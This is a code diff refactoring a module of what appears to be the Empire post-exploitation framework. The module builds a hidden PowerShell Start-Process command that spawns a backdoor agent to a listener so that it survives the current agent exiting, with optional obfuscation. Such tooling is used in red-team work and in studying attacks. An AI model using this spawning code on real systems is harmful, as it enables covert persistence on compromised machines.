@@ -47,28 +47,27 @@ class Module:
 
         if launcher == "":
             return handle_error_message("[!] Error in launcher command generation.")
+
+        # transform the backdoor into something launched by powershell.exe
+        # so it survives the agent exiting
+        if sys_wow64.lower() == "true":
+            stager_code = (
+                "$Env:SystemRoot\\SysWow64\\WindowsPowershell\\v1.0\\" + launcher
+            )
         else:
-            # transform the backdoor into something launched by powershell.exe
-            # so it survives the agent exiting
-            if sys_wow64.lower() == "true":
-                stager_code = (
-                    "$Env:SystemRoot\\SysWow64\\WindowsPowershell\\v1.0\\" + launcher
-                )
-            else:
-                stager_code = (
-                    "$Env:SystemRoot\\System32\\WindowsPowershell\\v1.0\\" + launcher
-                )
-
-            parts = stager_code.split(" ")
-
-            script = "Start-Process -NoNewWindow -FilePath \"{}\" -ArgumentList '{}'; 'Agent spawned to {}'".format(
-                parts[0], " ".join(parts[1:]), listener_name
+            stager_code = (
+                "$Env:SystemRoot\\System32\\WindowsPowershell\\v1.0\\" + launcher
             )
 
-        script = main_menu.modulesv2.finalize_module(
+        parts = stager_code.split(" ")
+
+        script = "Start-Process -NoNewWindow -FilePath \"{}\" -ArgumentList '{}'; 'Agent spawned to {}'".format(
+            parts[0], " ".join(parts[1:]), listener_name
+        )
+
+        return main_menu.modulesv2.finalize_module(
             script=script,
             script_end="",
             obfuscate=obfuscate,
             obfuscation_command=obfuscation_command,
         )
-        return script
